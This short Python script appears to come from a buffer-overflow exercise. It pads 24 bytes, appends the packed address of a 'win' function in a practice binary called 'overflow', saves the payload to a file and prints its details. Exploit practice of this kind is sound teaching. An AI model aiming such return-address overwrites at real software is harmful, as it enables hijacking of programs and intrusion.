import struct
win = 0x401190              # from: nm overflow | grep win   (this build only!)
payload = b"A" * 24 + struct.pack("<Q", win)
open("payload.bin", "wb").write(payload)
print("win address   =", hex(win))
print("payload len   =", len(payload))
print("payload hex   =", payload.hex())
